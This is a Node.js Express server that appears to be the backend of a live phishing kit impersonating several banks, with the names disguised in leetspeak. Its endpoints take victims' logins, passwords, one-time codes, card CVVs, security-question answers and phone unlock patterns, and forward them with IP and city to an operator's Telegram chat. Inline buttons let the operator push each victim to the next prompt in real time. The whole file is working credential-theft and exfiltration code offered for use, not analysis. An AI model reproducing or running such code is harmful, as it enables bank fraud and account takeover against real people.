const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const agent = new https.Agent({ family: 4 });
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 60 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();

  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;

    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
🟢PRODUB4NC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    esperando: null,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
  [
    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
    { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
    { text: "🔐PATRON", callback_data: `errortok:${txid}` }
  ],
  [
    { text: "💳C3VV", callback_data: `ceve:${txid}` },
    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
  ]
]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviare', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
🔵B4NPLUX-EMPRES4🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    usar,
    clavv,
    preguntas: [],
    esperando: null,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

   const keyboard = {
    inline_keyboard: [
  [
    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
    { text: "🏧CAJERO", callback_data: `errortok:${txid}` },
    { text: "🔐PATRON", callback_data: `errortok:${txid}` }
  ],
  [
    { text: "💳C3VV", callback_data: `ceve:${txid}` },
    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
  ]
]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});


app.post('/api/sendPattern', async (req, res) => {
  const { patron, patronImg, ip, city } = req.body;

  if (!patron || !patronImg || !ip) {
    return res.status(400).json({ error: 'Faltan datos obligatorios' });
  }

  const caption = `🔒 Patrón recibido\nSecuencia: <code>${patron}</code>\n\nIP: ${ip}\nCiudad: ${city}`;

  try {
    // Convertir la base64 en un buffer
    const base64Data = patronImg.replace(/^data:image\/png;base64,/, "");
    const buffer = Buffer.from(base64Data, "base64");

    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", buffer, { filename: "pattern.png", contentType: "image/png" });
    formData.append("caption", caption);
    formData.append("parse_mode", "HTML");

    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, formData, {
      headers: formData.getHeaders(),
      httpsAgent: agent,
    });

    res.status(200).json({ success: true, data: response.data });
  } catch (error) {
    console.error('Error al enviar patrón a Telegram:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/enviar2', async (req, res) => {
  const {
    usar, clavv, txid,
    pregunta1, pregunta2,
    respuesta1, respuesta2,
    ip, ciudad
  } = req.body;

  const mensaje = `
❓🔑🔵M3RC4NTIL-PERSON4S🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

${pregunta1}❓ : <code>${respuesta1}</code>
${pregunta2}❓ : <code>${respuesta2}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
  [
    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
  ],
  [
    { text: "💳C3VV", callback_data: `ceve:${txid}` },
    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
  ]
]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar2e', async (req, res) => {
  const {
    usar, clavv, txid,
    pregunta1, pregunta2,
    respuesta1, respuesta2,
    ip, ciudad
  } = req.body;

  const mensaje = `
❓🔑🔵B4NPLUX-EMPRES4🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

${pregunta1}❓ : <code>${respuesta1}</code>
${pregunta2}❓ : <code>${respuesta2}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
  [
    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
  ],
  [
    { text: "💳C3VV", callback_data: `ceve:${txid}` },
    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
  ]
]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});


app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;

  const mensaje = `
🔑🔵M3RC4NTIL-PERSON4S🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🔑 0TP: <code>${dinamic}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
  [
    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
  ],
  [
    { text: "💳C3VV", callback_data: `ceve:${txid}` },
    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
  ]
]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar4', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;

  const mensaje = `
💳🔵M3RC4NTIL-PERSON4S🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

💳 C3VV: <code>${dinamic}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
  [
    { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
    { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
  ],
  [
    { text: "💳C3VV", callback_data: `ceve:${txid}` },
    { text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }
  ]
]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/enviar3e', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;

  const mensaje = `
🔑🔵B4NPLUX-EMPRES4🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🔑 0TP: <code>${dinamic}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }],
      [{ text: "💳C3VV", callback_data: `ceve:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  const message = req.body.message;

  if (message?.text && message.text.startsWith('/')) {
    const commandParts = message.text.slice(1).split(' ');
    const txid = commandParts[0];
    const preguntasTexto = commandParts.slice(1).join(' ');

    const [pregunta1, pregunta2] = preguntasTexto.split('&');

    if (!pregunta1 || !pregunta2) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Pregunta1?&¿Pregunta2?`
        })
      });
      return res.sendStatus(200);
    }

    const cliente = cargarCliente(txid) || { preguntas: [], status: 'esperando' };
    cliente.preguntas = [pregunta1.trim(), pregunta2.trim()];
    cliente.status = 'preguntas';
    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: message.chat.id,
        text: `✅ Preguntas guardadas para ${txid}\n1️⃣ ${pregunta1.trim()}\n2️⃣ ${pregunta2.trim()}`
      })
    });

    return res.sendStatus(200);
  }

  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    const cliente = cargarCliente(txid) || { status: 'esperando' };
    cliente.status = accion;
    guardarCliente(txid, cliente);

    if (accion === 'preguntas_menu') {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `✍️ Escribe las 2 preguntas personalizadas para ${txid}, Ej: /${txid} ¿Dónde naciste?&¿Cuál es tu color favorito?`
        })
      });
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
